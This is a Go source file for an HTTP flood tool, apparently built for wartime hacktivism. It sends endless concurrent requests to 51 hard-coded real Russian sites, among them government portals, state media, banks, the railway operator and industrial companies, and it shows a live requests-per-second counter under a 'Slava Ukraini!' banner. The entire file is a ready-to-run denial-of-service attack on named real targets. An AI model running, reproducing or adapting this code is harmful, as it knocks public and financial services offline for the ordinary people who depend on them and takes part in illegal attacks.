package main

import (
	"fmt"
	"runtime"
	"strconv"
	"sync/atomic"
	"time"

	"github.com/gookit/color"
	"github.com/valyala/fasthttp"
)

var client = fasthttp.Client{MaxConnsPerHost: 999999}
var count int32
var errors int32

var urls = [51]string{
	"https://lenta.ru/",
	"https://ria.ru/",
	"https://ria.ru/lenta/",
	"https://www.rbc.ru/",
	"https://www.rt.com/",
	"http://kremlin.ru/",
	"http://en.kremlin.ru/",
	"https://smotrim.ru/",
	"https://tass.ru/",
	"https://tvzvezda.ru/",
	"https://vsoloviev.ru/",
	"https://www.1tv.ru/",
	"https://www.vesti.ru/",
	"https://online.sberbank.ru/",
	"https://sberbank.ru/",
	"https://zakupki.gov.ru/",
	"https://www.gosuslugi.ru/",
	"https://er.ru/",
	"https://www.rzd.ru/",
	"https://rzdlog.ru/",
	"https://vgtrk.ru/",
	"https://www.interfax.ru/",
	"https://www.mos.ru/uslugi/",
	"http://government.ru/",
	"https://mil.ru/",
	"https://www.nalog.gov.ru/",
	"https://customs.gov.ru/",
	"https://pfr.gov.ru/",
	"https://rkn.gov.ru/",
	"https://www.gazprombank.ru/",
	"https://www.vtb.ru/",
	"https://www.gazprom.ru/",
	"https://lukoil.ru/",
	"https://magnit.ru/",
	"https://www.nornickel.com/",
	"https://www.surgutneftegas.ru/",
	"https://www.tatneft.ru/",
	"https://www.evraz.com/ru/",
	"https://nlmk.com/",
	"https://www.sibur.ru/",
	"https://www.severstal.com/",
	"https://www.metalloinvest.com/",
	"https://nangs.org/",
	"https://rmk-group.ru/ru/",
	"https://www.tmk-group.ru/",
	"https://ya.ru/",
	"https://www.polymetalinternational.com/ru/",
	"https://www.uralkali.com/ru/",
	"https://www.eurosib.ru/",
	"https://ugmk.ua/",
	"https://omk.ru/"}

func main() {
	cpus := runtime.NumCPU()
	runtime.GOMAXPROCS(cpus)

	for i := 0; i < cpus*10; i++ {
		for _, url := range urls {
			go func(url string) {
				for {
					sendRequest(url)
					atomic.AddInt32(&count, 1)
				}
			}(url)
		}
	}

	fmt.Println(color.Cyan.Render("Slava ") + color.Yellow.Render("Ukraini!"))

	var lastTime int32

	for {
		lastTime = count

		time.Sleep(1 * time.Second)
		fmt.Print("\033[H\033[2J")
		fmt.Println(color.Cyan.Render("Slava ") + color.Yellow.Render("Ukraini!") + "\n")
		fmt.Println("Requests per second: " + color.Yellow.Render(strconv.Itoa(int(count-lastTime))))
		fmt.Println("Requests sent: " + color.Yellow.Render(strconv.Itoa(int(count))))
		fmt.Println("Successfull requests: " + color.Green.Render(strconv.Itoa(int(count-errors))))
		fmt.Println("Errors: " + color.Red.Render(strconv.Itoa(int(errors))))
	}
}

func sendRequest(host string) {
	req := fasthttp.AcquireRequest()
	req.SetRequestURI(host)
	res := fasthttp.AcquireResponse()

	err := client.Do(req, res)
	if err != nil {
		atomic.AddInt32(&errors, 1)
	}
	fasthttp.ReleaseRequest(req)
}
